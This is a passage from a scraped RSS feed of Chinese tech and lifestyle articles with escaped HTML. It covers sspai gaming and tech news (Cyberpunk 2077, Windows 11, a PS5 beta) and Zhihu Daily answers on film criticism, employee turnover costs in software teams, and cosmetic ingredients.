src=\"https://cdn.sspai.com/2021/06/24/cf7677a409d5abe7e27119ed9e5edc38.jpg\"></figure><p>由于参与法拍只为合张影的网友众多，在这里做个科普——如果拍下来不付钱，可不止是没收保证金这么简单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/62f92a71a0fe3c570887f4800bec511c.jpg\"></figure><p>可是，普法教育也挡不住各种专程前来打酱油的网友。</p>\n<p>6 月 22 日，同一名被执行人的另一件物品——一个粉红色的 4GB U盘被竞拍到了 39810 元，然后一样被法院中止。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/69affcdfaf9a1e119dbfafcddefce6c6.jpg\"></figure><p>只是一个 U 盘而已啊？</p>\n<p>你们是不是以为里面有比特币？</p>\n<ul><li>扩展阅读：<a href=\"https://www.zhihu.com/question/299977989\">法院都拍卖过哪些奇怪的东西？</a>\n</li></ul>\n<h3>《赛博朋克 2077》正式回归 PS 商店，官方不建议 PS4 玩家购买</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/59de301e4da93e7caf931acb36311fe9.jfif\"></figure><p><a href=\"https://twitter.com/PlayStation/status/1406922787382607875\">PlayStation</a> 官方宣布《<a href=\"https://store.playstation.com/product/HP4497-CUSA16570_00-0000000000000005?emcid=or-pl-405282\">赛博朋克 2077</a>》现已重新上架 PS 商店。</p>\n<p>PS4 版本的修复工作仍在进行中，更多修复内容及更新将在今年内陆续公布。为了获得最佳的游戏体验，PlayStation 官方建议在 PS4 Pro 或 PS5 主机上游玩，而不建议 PS4 玩家购买。</p>\n<p>《赛博朋克 2077》1.23 版本最近更新，跟往常一样，依然是在修 bug。</p>\n<p>按照 CDPR 之前的道歉声明和工作计划，免费的次时代版本更新将于今年下半年推出。</p>\n<p>结合本周第一条新闻来看，《赛博朋克 2077》至今最大的功劳就是让不少玩家在显卡大幅度涨价前为这个游戏升级了显卡配置。</p>\n<p>Xbox 终于结束了捡来的主机独占时期，这一独占就是半年。最后请 Xbox 玩家注意，Xbox 版《赛博朋克 2077》扩展退款政策将于 7 月 6 日结束。</p>\n<h3>《GTA》线上模式将于 12 月 16 日关闭 PS3 和 Xbox 360 版的服务器</h3>\n<p><a href=\"https://www.rockstargames.com/newswire/article/51989315o2aa3a/gta-online-for-playstation-3-and-xbox-360-will-shut-down-on-december-1\">Rockstar</a> 宣布由于关闭线上模式服务，PS3 和 Xbox 360 版的游戏内付费货币「鲨币」将在 9 月 15 日停止充值。</p>\n<p>这很可能是为了登陆次世代主机的《GTA V》加强版让路。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/5967350a62936fce3e89dd505d88d742.jpg\"></figure><h3>禁止内卷，开发《和平精英》的腾讯光子工作室推新规强制下班，实行一周以来效果如何？</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/eb5fef0fc7cb4a76835e950f4246f509.jpg\"></figure><p>开发了《和平精英》《欢乐斗地主》《节奏大师》的腾讯光子工作室内部的一份加班管理机制文件在互联网上广泛流传。</p>\n<p>文件中明确规定，每周三为健康日，早上 9 点半上班，晚上 6 点下班。同时，工作室要全面保障双休日和法定节假日休息，加班需要提前向领导申请报批，双休日不可连续加班。</p>\n<p>据瞎玩菌的鹅厂前同事匿名爆料，新规推行以来，确实有说到做到。晚上 9 点一到，老大就会来催员工下班；随后公司保安也会催促大家离开。然后电梯开始排起长龙，班车也变得拥挤了起来。</p>\n<p>而且不止光子工作室，腾讯游戏（即腾讯互娱事业部）本来就有周三健康日的惯例，周三不允许加班确实是这么实行的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/79721a3391cd8180361b7df7cf5bfd52.jpg\"><figcaption>日剧《我，到点下班》</figcaption></figure><h3>PS5 固件开放 beta 测试计划</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/426e6d865aa3f3a71d3602955719997d.jpg\"></figure><p>PS5 玩家可以通过 <a href=\"https://www.playstation.com/ps5/ps5-beta-program-sign-up\">官网</a> 注册登记，要求：</p>\n<ul>\n<li>年满 18 岁。</li>\n<li>暂时只面向美国、加拿大、日本、英国、德国和法国区域开放，请先使用对应区域的 PSN 账号登录再打开登记页面。</li>\n</ul>\n<p>参与测试的玩家请注意，系统固件版本可能存在不稳定的各种问题，请做好游戏存档的备份（推荐使用 PS+ 会员云存档和 USB 移动存储双重备份）。</p>\n<h3>Oculus Quest 更新增加了多任务和无线串流功能</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/69eef4285e73afbdacaa17fafe26a694.jpg\"></figure><p><a href=\"https://www.theverge.com/2021/6/18/22539750/oculus-quest-1-air-link-v30-update-multitasking\">Facebook</a> 正在向 Oculus Quest 和 Quest 2 VR 推出 v30 更新。正如 Mark Zuckerberg 本周早些时候所预览的那样，v30 包括一个无限办公室（Infinite Office）的全新多任务界面，让你把多个应用程序并排放在一起，包括浏览器、Oculus TV、Oculus Move、商店等等。</p>\n<p>v30 更新还为初代的 Quest 头显启用了 Air Link。Air Link 在 4 月时出现在 Quest 2 上，允许你将 VR 游戏从你的电脑无线传输到你的头显，而 Oculus Link 则通过 USB-C 电缆实现同样的功能。在以前，Quest 用户可以通过第三方应用程序 Virtual Desktop 无线传输 PC 游戏。</p>\n<h2>彩蛋</h2>\n<h3>🌈🥚1 国外黑客 <a href=\"https://twitter.com/HackerVilela/status/1405972177225191427\">@HackerVilela</a> 为 1990 年的 SNES 游戏《超级马力欧世界》制作了 <a href=\"https://github.com/VitorVilela7/wide-snes\">宽屏 mod</a>\n</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/50c706d56d30daf2766f27ea91fe60bd.png\"></figure><h3>🌈🥚2 《对马岛之鬼》的实体版封面去掉了 Only On PlayStation 字样，暗示这款游戏即将登陆 PC？</h3>\n<p><a href=\"https://direct.playstation.com/en-us/games/game/ghost-of-tsushima-ps4.3003170?smcid=pdc:us-en:web-pdc-games-ghost-of-tsushima:buttonblock-buy-now\">来源 1</a> | <a href=\"https://www.amazon.com/Ghost-Tsushima-PlayStation-4/dp/B08BSKT43L?ots=1&amp;slotNum=3&amp;imprToken=38bd1e60-32ba-ed31-76a\">来源 2</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/0b7ee718bb572724f68b9a9427202f76.png\"><figcaption>新封面</figcaption></figure><h3>🌈🥚3 据 <a href=\"https://twitter.com/StreamHatchet/status/1405218991518461956/photo/1\">Stream Hatchet</a> 统计，E3 期间 Xbox 发布会的观看人数创历史新高，但任天堂仍然是 E3 的主宰</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/7e712b87c568771bfe318591c7bbc492.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/84682d80dca78d61ea634cbe3378c43a.jpg\"></figure><h3>🌈🥚4 <a href=\"https://twitter.com/SEGA_OFFICIAL/status/1404998508264837121\">世嘉</a> 公布了一份超过 150 页的内部学习资料《<a href=\"https://www.slideshare.net/SEGADevTech/ss-249343092\">基础线性代数讲座</a>》，方便大家学习 3D 游戏开发</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/fde149e3d5803c5d2b760b8fa99f457a.png\"></figure><p>📧 反馈/纠错/提问 Email：<a href=\"mailto:xatest@gmail.com\" target=\"_blank\">xatest@gmail.com</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n","link":"https://sspai.com/post/67385"},{"title":"派早报：微软正式公布 Windows 11、Intel XMP 3.0 即将支持 DDR5 等","date":"2021-06-25 01:00:00","description":"\n<h2>微软正式公布 Windows 11</h2>\n<p>6 月 24 日晚间，微软通过线上直播正式公布了下一代桌面操作系统更新 Windows 11。Windows 11 在外观上与早前流出的泄露版并无太大差异，相比 Windows 10 最大的变化在于底部任务栏图标的居中、全新设计的开始菜单以及系统内大量圆角设计的引入；功能方面 Windows 11 为窗口操作扩展了快速窗口布局功能，不同应用窗口组成的布局方式还能保存为 snap group 群组，以单个图标的方式在任务栏呈现，方便用户快速切换；同时 Windows 11 也改善了外接屏幕支持，能够记住屏幕状态变化前后的窗口位置。</p>\n<p>软件体验方面，Windows 11 将预置 Teams 应用并与任务栏整合，同时拥有更好的平板触屏设备交互支持；引入 Xbox Series X|S 的 Auto HDR 和 Direct Storage 技术，为游戏带来更好的画面效果和更短的加载时间；支持运行 Android 应用，允许用户通过全新设计的 Microsoft 商店或亚马逊 App 商店进行安装。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/6256e0e53295558b3a4c2da5801ecb41\"><figcaption>新的应用商店</figcaption></figure><p>Windows 11 将于下周率先登陆 Windows Insider 预览版计划，正式推出时间预计在 2021 年圣诞节前后；Windows 10 用户可免费升级。 </p>\n<p>如果你想了解更多关于 Windows 11 改动的详细信息，可以关注少数派之后的更多报道。 <a href=\"https://cn.engadget.com/windows-11-launch-microsoft-153031948.html\" target=\"_blank\">来源</a></p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/67328\" target=\"_blank\">这就是下一代的 Windows？Windows 11 上手体验</a></p>\n<h2>Intel XMP 3.0 即将支持 DDR5</h2>\n<p>6 月 24 日，根据 HWiNFO 更新日志显示，Intel 目前正在开发 Extreme Memory Profile 3.0 的相关内容，并将支持 DDR5 内存超频。Extreme Memory Profile 3.0 意味着可以对电压进行更精准地调整，使得 DDR 5 最高支持 8400MHz 的内存频率。<a href=\"https://videocardz.com/newz/hwinfo-lists-intel-xmp-3-0-for-ddr5-memory-in-upcoming-software-changes\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/bb57e5cfb55094a295bce316ad4bbefe\"><figcaption>图片来自 HWiNFO</figcaption></figure><h2>TCL 显示器型眼镜将于下月登陆澳大利亚</h2>\n<p>TCL 于 6 月 24 日宣布，其显示器型眼镜将会在下月在澳大利亚开售，售价为 899 澳元，该眼镜将不会是所谓的 VR 或者 AR 设备，而是移动设备或者笔记本电脑的外部显示器，采用两个 1080P 的微型 OLED面板，可提供近似 140英寸屏幕的显示效果，适用于采用 USB-C DisplayPort 功能的手机、平板电脑和笔记本电脑，插入即可显示类似 16：9 屏幕的显示内容。<a href=\"https://www.theverge.com/2021/6/24/22545583/tcl-nxtwear-g-wearable-display-glasses-availability-price\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/2512a0dc5985e41edc9405f5bfae5702\"><figcaption>TCL 显示器型眼镜</figcaption></figure><h2>联想推出适用于笔记本的无线充电套装</h2>\n<p>联想于 6 月 24 日正式发布一款名为 Go 无线充电套件的新产品，可以为各种笔记本改装为无线充电功能，其采用了 Energy Square 的 Power by Contact 技术，通过一个3.2 毫米厚的拉丝金属充电垫进行输出，而电脑端通过 USB-C 连接无线充电接收器进行接收供电，设置完成后将可以为大多数 13 寸和 14 寸非触摸式笔记本电脑进行充电，效率可达 93%，该套件将在 10 月开售，售价为 139.99 美元。<a href=\"https://www.theverge.com/2021/6/24/22548300/lenovo-go-wireless-charging-kit-laptop-charger-date-price\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/10affda27353df6d4f9634a0804eaf36\"><figcaption>Go 无线充电套件</figcaption></figure><h2>Google 联合 Jio 推出入门智能机 JioPhone Next</h2>\n<p>Google 和印度运营商 Jio 于 6 月 24 日正式发布了廉价版本智能手机 JioPhone Next，该手机将采用优化过的 Android 系统提供了包括文字朗读、立即翻译等功能，另外手机还将搭配一个高质量并支持 HDR 的摄像头， 目前该机硬件配置和价格尚未公布，但将会 9 月 10 日在印度正式发售，未来将会在印度之外的地区上市。<a href=\"https://techcrunch.com/2021/06/24/google-and-jio-platforms-announce-worlds-cheapest-smartphone-jiophone-next/\" target=\"_blank\">来源</a></p>\n<h2>Apple 推送 iOS 15 beta 2 以及 iPadOS 15 beta 2</h2>\n<p>6 月 24 日，Apple 向开发者推送 iOS 15 beta 2 以及 iPadOS 15 beta 2。与此同时，Apple 还发布了适用于 Apple TV 和 HomePod 的 tvOS 15 beta 2 以及适用于 Apple Watch 的 watchOS 8 beta 2。</p>\n<p>如果你想了解更多关于新 beta 改动的详细信息，可以关注少数派之后的更多报道。<a href=\"https://9to5mac.com/2021/06/24/ios-15-beta-2-now-available/\" target=\"_blank\">来源</a></p>\n<h2>TiMi 工作室宣布成立 3A 游戏开发工作室</h2>\n<p>6 月 24 日，腾讯 TiMi 工作室发布推文宣布，在美国西雅图建立新工作室「TiMi Seattle」，</p>\n<p>该项目由 Scott Warner 与 Rosi Zagorcheva 带队，致力于 3A 级第一人称射击类游戏的开发。<a href=\"https://venturebeat.com/2021/06/23/timi-opens-seattle-studio-to-make-triple-a-games/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/6040826c42879a2426b9a231071519ea\"></figure><h2>你可能错过的文章</h2>\n<ul>\n<li>🎧 <a href=\"https://sspai.com/post/66851\" target=\"_blank\">旗舰 TWS 再试水，小米的旗舰主动降噪耳机用起来怎么样？</a>\n</li>\n<li>🚪 <a href=\"https://sspai.com/post/66914\" target=\"_blank\">开放空间中的独立，老房子装修思考</a>\n</li>\n<li>⌨️ <a href=\"https://sspai.com/post/67354\" target=\"_blank\">手腕救星还是烧钱摆件？聊聊人体工学键盘</a>\n</li>\n<li>🛒 <a href=\"https://sspai.com/post/67402\" target=\"_blank\">新玩意 068｜少数派的编辑们最近买了啥？</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67408"},{"title":"影评到底有什么用？","date":"2021-06-24 23:07:37","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-7fd4fce5376126c913156770ec14320d_l.jpg?source=8673f162\"><span>张小北，</span><span>编剧、导演</span>\n<a href=\"https://www.zhihu.com/question/322137894/answer/1955839963\" hidden>阅读原文</a>\n</div>\n<div>\n<p>这是我在 2018 年给《如何聊电影》这本书写的书评，但正好也可以回答这个问题。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9e7e455fcf7bbc94cbb7572552299b2a_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>在一个所有人都可以在网络上聊电影的时代，我们为什么还要去看一本教你“如何聊电影”的书呢？因为当我们在聊一部电影时，如果我们没有一些共同的标准，那么我们说的其实并不是同一部电影。如果没有这些共同的标准，绝大部分在网络上聊电影的行为，最后都会变成无谓的口水之争。如何去了解一部电影，如何去建立看电影的基本标准，这是一个可以复杂也可以简单的问题。而我今天之所以愿意在这里认真推荐《如何聊电影》这本书，是因为我觉得这本书能够切实有效地帮助到那些严肃的电影爱好者。</strong></p>\n<p>本书作者安·霍纳迪（Ann Hornaday 《华盛顿邮报》首席电影评论家）和中国的大部分“影评人”不同之处在于，她是一个“职业影评人”。在职业生涯的起点，安·霍纳迪先是为《首映》杂志和《纽约时报》做电影相关板块的撰稿人，随后受邀担任了《奥斯汀美国政治家报》的特约影评人，并由此建立了行业声誉，然后又陆续在《巴尔的摩太阳报》和《华盛顿邮报》担任专职影评人，并于 2008 年荣获普利策新闻奖 “最佳评论人”提名。从业三十多年以来，安·霍纳迪采访过李安、马丁·斯科塞斯、史蒂文·斯皮尔伯格、加里·奥德曼、卡西·阿弗莱克、蒂尔达·温斯顿等众多影视界知名人士。亚马逊读者评价她是“继罗杰·伊伯特之后可相信、跟随”的影评人。</p>\n<p>对于不太了解美国新闻出版行业的朋友们来说，安·霍纳迪任职的前两家报纸可能都没有听说过，但《华盛顿邮报》对于所有新闻专业或相关背景的中国读者来说，一定不会陌生。（如果有朋友想要了解《华盛顿邮报》的相关背景，可关注一下由史蒂文·斯皮尔伯格导演的同名电影《华盛顿邮报》。它在 2018 年获得了第 90 届奥斯卡金像奖最佳影片和最佳女主角提名，以及一系列相关的年度电影奖项，是一部非常优秀的电影。）之所以要花费一点笔墨专门介绍一下这家报纸，是想强调一下本书作者安·霍纳迪的专业背景，以及她为什么会成为一个被广泛认可的影评人。简单总结一下，就是安·霍纳迪作为一个美国的职业影评人，她更多的身份其实是一个媒体人，而不是一个参与电影制作和宣发环节的电影人。这一点是和当下中国的绝大多数“影评人”最为显著的不同之处。而这个不同，也影响到了当下中国的绝大多数影评的基本立场和质量，以及我们应该用什么样的眼光和角度去评论一部电影。</p>\n<p>当我们在说到一部电影的原创性、视听语言、制作水准、表演等等环节时，我们到底在讨论的是什么？我们应该用何种标准去讨论？以及我们应该用什么样的眼光和角度去看待一部中国电影？很遗憾的是，现在中文网络上的绝大多数“影评”是无法给到上面这些问题的答案的。这也是《如何聊电影》这本书的意义所在，我们可以借鉴和学习一个成熟的电影市场里的成熟电影评论的行业标准，并努力把这些有意义的标准体系落地，通过很多人的努力，去建立一个对于当代中国电影有意义和有价值的评论体系。</p>\n<p>什么是“好”？什么是“坏”？什么是“演技”？什么是“剧作”？什么是“导演手法”？什么是“视听语言”？这些熟悉而又陌生的名词，并不是仅仅专属于电影制作者的，对于严肃的电影爱好者，以及有志于影评写作的评论者，搞明白这些基本的概念，以及这些基本概念如何呈现在当代的中国电影中，都是非常有意义的事情。因为只有当有志于严肃影评写作的评论者们能够建立起一个统一的行业标准后，我们才能向更大多数的观众和电影消费者去普及和推广有关电影的一切。我们不能继续沉迷在微信公众号的截图说明文字，以及各种煽动性观点之中，从而忽略了“电影”本身所应具有的艺术和商业价值。</p>\n<p>而《如何聊电影》这本书，就是一个很好的起点，它能够深入浅出地介绍关于电影的基本构成，如剧作、表演、美术、摄影、剪辑、声音和音乐、导演等电影创作的重要环节是如何发展而来的，又是如何在一部电影的创作过程中发挥作用的，以及它们最后是如何整体构成了一部电影，并且将情感和价值观、理念传递给普通观众的。我希望所有有志于影评写作的读者，都能认真地阅读此书，并且能够将本书保留在手边，作为随时可以取阅的参考书。因为只有当我们开始尊重标准、尊重创作和创作者，我们才能开始尊重观众，尊重电影本身。</p>\n<p>一本好书，一部好电影，都能让你在某些时刻重新回忆起，你为什么会喜欢上电影。王小波说过：“一个人只拥有此生此世是不够的，他还应该拥有诗意的世界。”而我很幸运，能够有机会喜欢电影，通过电影去发现那个更大的世界，从中去寻找属于我的那个诗意的世界。</p>\n<p>作为一个影迷，我有机会鼓起勇气去尝试打破时间对凡人的禁锢，去发现更大的世界，体验更多的人生，尝试更多的情感。而这一切，让我更热爱我当下所能拥有的生活，感受更多平凡生活之中的不凡瞬间，以及努力超越平庸。</p>\n<p>优秀的电影让我们的生命在不同纬度上得以延伸，通过黑暗中的光影，我们有机会跨越时间和空间的限制，几乎是无限地拓展自己的生命体验，同时领悟那些被掩盖在平凡人生之后的永恒真理。这一点是非常难得的生命体验，它帮助我们超越自己狭窄的人生体验，并且提升对自我、社会和世界的认知。它让我们知道，这个世界很大，我们永远有选择让自己和世界更美好。同时它没有那么完美，它隐藏了许许多多人性的极致，以及背后的黑暗甚至残酷。但是，要了解自我和人性，那么看到黑暗是必须的。电影给我们机会，让我们完整地体验了不同的人生，同时让我们在现世之中继续拥有我们自己的平凡生活，同时努力让它变得更加美好。</p>\n<p>而能够将那道光带给我们的幸福，传递给更多人，则是优秀的影评所应肩负起的责任。好的影评，不应该仅仅只是易朽的商业快餐文字，而是应该<strong>努力传递内心的真诚感受，揭露营销谎言，挖掘被埋藏的佳作，以及努力尝试去战胜时间</strong>。希望能够有更多有志于影评写作的朋友，能够通过此书得到有益的启示。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/322137894\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737423"},{"title":"一个员工的离职成本到底有多高？","date":"2021-06-24 23:07:32","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-57e729e720a36349239581fec46f3362_l.jpg?source=8673f162\"><span>沈世钧，</span><span>骨灰级程序员｜软件架构｜人工智能</span>\n<a href=\"https://www.zhihu.com/question/289588888/answer/598581200\" hidden>阅读原文</a>\n</div>\n<div>\n<p>员工的离职成本非常高，尤其在软件行业。</p>\n<p>除了和传统企业一样，在员工离职时，会付出招聘、交接、培训成本外。离职率太高，对软件企业，还有一个极度恶劣的后果，那就是：</p>\n<p><strong>极大的加速软件系统的腐败</strong>。</p>\n<p>因为软件是纯粹脑力劳动的结果，极度依赖软件工程师本人。因此，软件的交接就不简单是生产工具的交接，更是知识的传递。而只要有知识的传递就必然有丢失，有变形。因此一个离职频繁的团队，知识的反复交接，必然会丢失大量的细节，以致于到最后，接手的程序员对系统的理解是面目全非。</p>\n<p>而且最严重的不仅是知识的丢失，更有责任心的丢失。</p>\n<p>如果一个模块是由某个软件工程师一手开发并维护。在感情上，他自然的倾向于爱惜羽毛，认真对待。在责任上，他也无可推卸，因为这一切都源于他。但是，在一个离职率高的团队，一个软件反复转手，后来者除了感情不深外。出了问题，也自然的会把所有的缺陷归罪于前人，包括设计和开发。</p>\n<p>一个反复转手的软件，必定会出现经典的“<strong>破窗效应</strong>”：</p>\n<p>“反正系统已经这么烂了，而且也不是我的责任，我既没有能力，也没有必要去矫正它。”</p>\n<p>于是，有了 bug，接手者自不会去认真研究问题的根源，而是倾向于用快速且肮脏的“打补丁”方式来解决。反正是先把问题摁住，至于整个系统是否会越来越腐败，管它呢？</p>\n<p>因此，整个软件系统最终呈现的就是补丁摞补丁的“垃圾场”。</p>\n<p>而我在软件圈所见所闻，也正有力的验证着该理论。</p>\n<p>我一好友，在某在线旅游网站工作，去年（2018）年初告我，连着两个星期，他每天中午都要吃“散伙饭”，以至于 20 人的团队，过了年，领了年终奖，一个月的时间竟走掉了 70%的人，最后只剩下区区 5 人。</p>\n<p>因为机缘巧合，我也读过他们的代码。老实说，肮脏不堪，典型的“金玉其外败絮其中”。</p>\n<p>我认真的和朋友讨论他们的代码，为什么明明是一些低级的错误（例如不规范的变量命名，冗余的变量定义），随手就能改的东西，就生生的横在哪里，没人管。朋友沉默一会，坦诚一个重要的原因就是员工的频繁流动。</p>\n<p>也许你今天还和某个同事讨论开发细节，明天他就会通知你他要离职了。甚至于朋友的入职导师，一个月时间不到，竟也要离职。于是，本来需要辅导的朋友，反过身来却要和导师交接工作，你说荒唐不荒唐？</p>\n<p>而这种现象，对一个团队的软件质量来说，简直就是绝症。每个人在工作的时候，脑子里想的最多就是自己的跳槽和别人的跳槽。所有的工作都倾向于“将就”，反正 “<strong>我走后那管他洪水滔天，也和我无关</strong>！”。</p>\n<p>而且，据我所知，在软件行业，离职率高是一种普遍现象，即使是一些行业巨头，离职率也达到惊人的 20%。这也就意味着，每过 5 年，整个团队就会被清洗一遍，这种情况下，再谈知识传承和软件质量，该是多么的不现实！</p>\n<p>而这一切的根本，员工固然有责任，但更应该反思的是管理层：为什么员工的离职率这么高？是因为待遇不公？还是工作量不合理？或者只是态度不好？</p>\n<p>这篇问答不仅是写给别人，更是写给我自己，我需要时刻诫勉自己：务必善待同事，因为在软件行业，<strong>人真的就是一切</strong>！</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/289588888\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737418"},{"title":"化妆品里面最神奇的都有哪些东西？","date":"2021-06-24 23:07:25","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-5ec2a04d747dff9845713ffe0964954b_l.jpg?source=8673f162\"><span>胖博士，</span><span>懂你皮肤问题的清华胖师兄</span>\n<a href=\"https://www.zhihu.com/question/46245671/answer/1956438611\" hidden>阅读原文</a>\n</div>\n<div>\n<p>题主举了几个化腐朽为神奇的化妆品成品例子，其实化妆品里的成分更神奇，因为成品的功效都来自成分的组合啊！</p>\n<p>这些神奇的成分，我能给你聊三天三夜，因为我在欧莱雅中国研发中心的工作就是研究各种神奇的成分推荐给实验室。在这里，我就举几个你没怎么听过的例子，和好奇宝宝们分享一下。</p>\n<p><strong>PMMA（聚甲基丙烯酸甲酯）</strong></p>\n<p>相信你看到这个成分名字，第一反应是“这是什么鬼？”那我换个说法，叫它“柔焦因子”，是不是觉得眼熟多了？</p>\n<p>不少化妆品里会加入 PMMA 的微球，它能带来清爽的肤感，提供哑光雾面效果，所以在营销的时候，会把它叫做柔焦因子。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-70974757b3f2913437666650273d2ad8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>PMMA 微球（图片来自网络）</figcaption></figure><p>它哑光柔焦的原理在于把照射到脸上的光线从镜面反射变成漫反射。于是脸上看起来显得非常柔和，自带柔焦效果。</p>\n<p>因为微球颗粒小，比表面积大，它还可以吸附一部分油脂。所以对于大油皮来说，它还有控油的效果。</p>\n<p>把 PMMA 微球添加到配方里，使用产品的时候，PMMA 小颗粒在皮肤上滚动，带来非常特殊的爽滑肤感。</p>\n<p>所以 PMMA 是一种非常神奇的柔焦因子 + 肤感调节剂 + 吸油成分。</p>\n<p><strong>卡波姆</strong></p>\n<p>去年年初新冠疫情爆发的时候，卡波姆曾经供不应求，因为它不仅仅在化妆品里广泛应用，也是免洗洗手液的核心成分。它最神奇的地方在于能把清水变成啫喱状的凝胶。给某些化妆品带来“质感”，当然，也给某些奸商提供了以次充好的可乘之机。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-eae2b36e38d2ea063fdd29a138efe4ae_720w.jpg?source=8673f162\" alt=\"\"><figcaption>卡波姆把水变成凝胶（图片来自网络）</figcaption></figure><p>卡波是超大分子的丙烯酸聚合物。因此超大分子量和内部交联聚合，形成了一个个直径在微米级别的聚丙烯酸分子。遇水中和之后，聚丙烯酸变成钠盐，内部互相排斥，整个分子骨架展开。其中的羰基因为氢键作用，牢牢的抓住水。于是变成一个个小小的像果冻一样的微凝胶。这些小果冻堆积在一起，让整个溶液变得粘稠，变得有质感。所以在化妆品里，我们把卡波姆和类似的成分叫做“增稠剂”。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-abad13b8832040e75708454e258e9884_720w.jpg?source=8673f162\" alt=\"\"><figcaption>卡波姆的增稠原理（图片来自网络）</figcaption></figure><p>增稠剂可以给化妆品带来很多好处，例如粘稠的液体更容易使用（脑补一下免洗洗手液，如果用酒精就会流的到处都是），粘稠的配方更加稳定（限制了其中液滴的分子运动）。当然，一些无良的商家也会通过添加增稠剂，让本来没什么料的配方看起来更有质感，更有料。</p>\n<p><strong>有机硅弹性体</strong></p>\n<p>这算是我最爱的化妆品成分，没有之一。因为它能给配方带来天鹅绒般的肤感，而且能让油腻的配方瞬间变得清爽，简直是肤感调节的神器。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7510f02a51770a52e42d91bd0b7ff27d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>有机硅弹性体（图片来自瓦克资料）</figcaption></figure><p>我见过最牛的配方是一个透明的防晒乳（你见过透明的乳液吗？我见过！）</p>\n<p>配方师在乳液的水相中加入大量的甘油，让水相的折射率变的和油一样，这样乳液就变的透明了。然而大量甘油让配方的肤感粘不拉几，极其糟糕。配方师在水相里加入有机硅弹性体，瞬间把配方变成天鹅绒般的柔软肤感。</p>\n<p><strong>云母</strong></p>\n<p>你一定见过小姐姐们 Blingbling 的眼影，闪亮的眼影让整个眼睛都炯炯有神。眼影里面的核心成分就是云母。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-77fa0beb9b1a099f2465d8727c8c99d4_720w.jpg?source=8673f162\" alt=\"\"><figcaption>眼影（图片来自网络）</figcaption></figure><p>云母是一种片状结构的粉末。所以光线照射到它表面的时候，发生的是镜面反射，而非前面提到 PMMA 那样的漫反射。使用眼影之后，云母在皮肤表面铺展开。不同角度下被光照之后，部分云母发生镜面反射，就带来 Blingbling 的感觉了。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-87df34acd5326e8d7494ca37850c0fc3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>云母片（图片来自网络）</figcaption></figure><p>如果我们看大的云母片，会更直接一些。它们就像妹衣服上的亮片一样，熠熠生辉。</p>\n<p><strong>包裹体</strong></p>\n<p>la prairie 的鱼子酱精华卖的贼贵。还有市面上各种含有包裹体的精华，都很高端。形形色色的包裹体，给大家带来定制的体验。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-606637d15ba345e5183c10c8650750e0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>鱼子酱精华（图片来自网络）</figcaption></figure><p>全世界做包裹体最好的供应商就在中国，他们家能做各种尺寸，各种形状，各种功能的包裹体。</p>\n<p>想把色粉包进去？没问题！</p>\n<p>想把活性成分包进去？没问题！</p>\n<p>想把油包进去？没问题！</p>\n<p>甚至整个配方都可以包进去！</p>\n<figure><img 